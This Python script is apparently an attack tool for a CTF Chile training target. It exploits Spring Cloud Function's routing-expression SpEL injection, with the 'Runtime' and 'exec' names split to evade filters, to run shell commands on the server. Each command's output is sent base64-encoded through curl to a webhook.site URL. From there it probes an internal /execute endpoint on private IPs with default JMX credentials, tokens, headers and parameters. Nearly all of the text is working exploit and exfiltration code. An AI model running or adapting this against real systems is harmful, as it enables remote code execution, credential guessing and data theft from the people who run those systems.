#!/usr/bin/env python3
"""
CTF Chile - Explorar endpoint /execute que retorna 403
"""
import requests
import time
import base64
import json

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Explorando endpoint /execute...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:45} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Probar /execute con autenticación HTTP Basic...")

# Credenciales JMX
creds = [
    ("monitorRole", "QED"),
    ("controlRole", "R&D"),
    ("monitor", "QED"),
    ("control", "R&D")
]

hosts = ["10.160.209.1", "10.109.220.1"]

for host in hosts:
    for user, password in creds:
        host_safe = host.replace(".", "_")
        user_safe = user.replace("Role", "").replace("&", "and")

        # Basic Auth en /execute con diferentes métodos
        probe(f"exec_basic_get_{host_safe}_{user_safe}", f"curl -s -u {user}:{password} http://{host}:8000/execute 2>/dev/null")
        probe(f"exec_basic_post_{host_safe}_{user_safe}", f"curl -s -X POST -u {user}:{password} http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 2: Probar /execute con Bearer tokens...")

for host in hosts:
    for user, password in creds:
        host_safe = host.replace(".", "_")
        user_safe = user.replace("Role", "").replace("&", "and")

        # Bearer token
        probe(f"exec_bearer_{host_safe}_{user_safe}", f"curl -s -H 'Authorization: Bearer {password}' http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 3: Probar /execute con datos JSON...")

# JSON payloads para probar
json_payloads = [
    '{"command": "ls"}',
    '{"cmd": "whoami"}',
    '{"action": "list"}',
    '{"execute": "id"}',
    '{"user": "monitor", "password": "QED"}',
    '{"user": "control", "password": "R&D"}'
]

for host in hosts:
    host_safe = host.replace(".", "_")
    for i, payload in enumerate(json_payloads):
        probe(f"exec_json_{host_safe}_{i}", f"curl -s -X POST -H 'Content-Type: application/json' -d '{payload}' http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 4: Probar /execute con autenticación combinada...")

for host in hosts:
    for user, password in creds[:2]:  # Solo las primeras 2
        host_safe = host.replace(".", "_")
        user_safe = user.replace("Role", "").replace("&", "and")

        # Basic Auth + JSON payload
        auth_json = json.dumps({"user": user, "password": password}).replace('"', '\\"')
        probe(f"exec_combo_{host_safe}_{user_safe}", f"curl -s -X POST -u {user}:{password} -H 'Content-Type: application/json' -d '{auth_json}' http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 5: Probar headers de autenticación específicos...")

# Headers específicos que podrían funcionar
auth_headers = [
    ("X-API-Key", "QED"),
    ("X-API-Key", "R&D"),
    ("X-Auth-Token", "QED"),
    ("X-Auth-Token", "R&D"),
    ("X-Vault-Token", "QED"),
    ("X-Vault-Token", "R&D")
]

for host in hosts:
    host_safe = host.replace(".", "_")
    for header, value in auth_headers:
        header_safe = header.replace("-", "_").lower()
        value_safe = value.replace("&", "and")
        probe(f"exec_header_{host_safe}_{header_safe}_{value_safe}", f"curl -s -H '{header}: {value}' http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 6: Probar /execute con parámetros URL...")

# Parámetros en la URL
url_params = [
    "?token=QED", "?token=R&D", "?key=QED", "?key=R&D",
    "?user=monitor&pass=QED", "?user=control&pass=R&D",
    "?auth=QED", "?auth=R&D"
]

for host in hosts:
    host_safe = host.replace(".", "_")
    for param in url_params:
        param_safe = param.replace("?", "_").replace("=", "_").replace("&", "_")
        probe(f"exec_url_{host_safe}{param_safe}", f"curl -s http://{host}:8000/execute{param} 2>/dev/null")

print("[*] FASE 7: Verificar métodos HTTP completos en /execute...")

# Probar todos los métodos HTTP
http_methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]

for host in hosts:
    host_safe = host.replace(".", "_")
    for method in http_methods:
        probe(f"exec_method_{host_safe}_{method.lower()}", f"curl -s -X {method} -i http://{host}:8000/execute 2>/dev/null | head -5")

time.sleep(25)

# Recoger y analizar respuestas
print("\n[*] Analizando respuestas del endpoint /execute...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=60", timeout=20)
data = r.json().get("data", [])

successful_responses = []
auth_errors = []
interesting_responses = []
flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar respuestas exitosas (no 403/404)
            if not any(keyword in decoded.lower() for keyword in ["forbidden", "not found", "unauthorized"]):
                if len(decoded.strip()) > 10:
                    successful_responses.append((path, decoded))
                    print("✅ RESPUESTA EXITOSA")

            # Detectar errores de autenticación específicos
            if any(keyword in decoded.lower() for keyword in ["unauthorized", "forbidden", "invalid", "authentication"]):
                auth_errors.append((path, decoded))
                print("🔐 ERROR DE AUTENTICACIÓN")

            # Detectar respuestas interesantes
            if any(keyword in decoded.lower() for keyword in ["error", "missing", "required", "parameter"]):
                if len(decoded.strip()) > 20:
                    interesting_responses.append((path, decoded))
                    print("⚠️ RESPUESTA INTERESANTE")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DEL ENDPOINT /EXECUTE")
print("="*70)

if successful_responses:
    print(f"✅ RESPUESTAS EXITOSAS: {len(successful_responses)}")
    for path, content in successful_responses:
        print(f"    🎯 {path}")
        print(f"       {content[:150]}...")

if auth_errors:
    print(f"\n🔐 ERRORES DE AUTENTICACIÓN: {len(auth_errors)}")
    for path, content in auth_errors:
        print(f"    - {path}: {content[:100]}...")

if interesting_responses:
    print(f"\n⚠️ RESPUESTAS INTERESANTES: {len(interesting_responses)}")
    for path, content in interesting_responses:
        print(f"    - {path}: {content[:100]}...")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    🎯 {path}: {flag}")
else:
    print("\n💭 El endpoint /execute existe pero requiere autenticación específica.")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")